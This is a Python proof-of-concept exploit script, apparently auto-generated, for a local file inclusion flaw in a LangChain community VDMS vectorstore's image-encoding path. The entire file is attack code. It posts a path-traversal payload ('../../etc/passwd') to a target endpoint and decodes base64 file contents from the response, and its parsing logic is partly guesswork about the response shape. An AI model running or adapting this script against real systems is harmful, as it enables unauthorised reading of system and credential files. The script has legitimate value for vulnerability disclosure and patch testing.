#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: lfi-010
# Sink: encode_image
# Auto-generated — run with: python3 lfi_supply_paths_like_encode_image.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for Local File Inclusion (LFI) in langchain-community-only.

Vulnerability: The `add_images` method in VDMS vectorstore accepts user-controlled
file paths (`uris`) and passes them directly to `encode_image`, which opens the file
without any validation. An attacker can read arbitrary files via path traversal.

This PoC demonstrates reading /etc/passwd by sending a malicious URI to the
simulated endpoint that wraps the vulnerable library code.
"""

import requests
import sys
import base64

# ── Configuration ──────────────────────────────────────────────────────────────
TARGET_URL = "http://localhost:8080/api/v1/trigger"  # Change to actual target
TIMEOUT = 10  # seconds

# ── Exploit ────────────────────────────────────────────────────────────────────

def exploit_lfi(target_url: str, file_path: str) -> str:
    """
    Exploit the LFI vulnerability to read an arbitrary file.

    Args:
        target_url: The vulnerable endpoint URL.
        file_path: Path to the file to read (e.g., '../../etc/passwd').

    Returns:
        Decoded content of the file if successful.

    Raises:
        requests.exceptions.RequestException: On network errors.
        ValueError: If response is unexpected.
    """
    # The vulnerable library expects a list of URIs (file paths).
    # We send a path traversal payload to read an arbitrary file.
    payload = {
        "uris": [file_path]  # Attacker-controlled path
    }

    print(f"[*] Sending exploit payload: {payload}")
    print(f"[*] Target: {target_url}")

    try:
        response = requests.post(
            target_url,
            json=payload,
            timeout=TIMEOUT
        )
        response.raise_for_status()  # Raise exception for HTTP errors
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the target server running?")
        sys.exit(1)
    except requests.exceptions.Timeout:
        print("[-] Request timed out.")
        sys.exit(1)
    except requests.exceptions.RequestException as e:
        print(f"[-] HTTP error: {e}")
        sys.exit(1)

    # The response should contain the base64-encoded file content.
    # The library returns a list of IDs, but the file content is embedded
    # in the response as part of the vectorstore processing.
    # We need to extract the base64 string from the response.
    # In a real scenario, the response structure depends on the endpoint.
    # Here we assume the response contains the base64 data in a field.
    try:
        data = response.json()
        # The vulnerable code returns base64-encoded images.
        # We look for any field that might contain base64 data.
        # Common patterns: "b64_texts", "result", "data", etc.
        b64_text = None
        if isinstance(data, dict):
            # Try common field names
            for key in ["b64_texts", "result", "data", "texts", "embeddings"]:
                if key in data and isinstance(data[key], list) and len(data[key]) > 0:
                    b64_text = data[key][0]
                    break
            # If not found, try to find any string that looks like base64
            if not b64_text:
                for value in data.values():
                    if isinstance(value, str) and len(value) > 50:
                        # Heuristic: base64 strings are long and alphanumeric
                        if all(c in "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=" for c in value):
                            b64_text = value
                            break
        elif isinstance(data, list) and len(data) > 0:
            b64_text = data[0] if isinstance(data[0], str) else None

        if not b64_text:
            print("[-] Could not find base64-encoded data in response.")
            print(f"[*] Raw response: {response.text[:500]}")
            sys.exit(1)

        # Decode base64 to get file content
        decoded = base64.b64decode(b64_text).decode("utf-8", errors="replace")
        return decoded

    except (ValueError, KeyError, TypeError) as e:
        print(f"[-] Failed to parse response: {e}")
        print(f"[*] Raw response: {response.text[:500]}")
        sys.exit(1)


def main():
    """Main entry point."""
    # Use a benign payload by default: read /etc/passwd (safe on most systems)
    # Change to any file path for testing.
    file_to_read = "../../etc/passwd"  # Path traversal to read system file

    print("[*] LFI Exploit for langchain-community-only VDMS")
    print(f"[*] Attempting to read: {file_to_read}")

    try:
        content = exploit_lfi(TARGET_URL, file_to_read)
        print("[+] Success! File content:")
        print("-" * 60)
        print(content)
        print("-" * 60)
    except Exception as e:
        print(f"[-] Exploit failed: {e}")
        sys.exit(1)


if __name__ == "__main__":
    main()
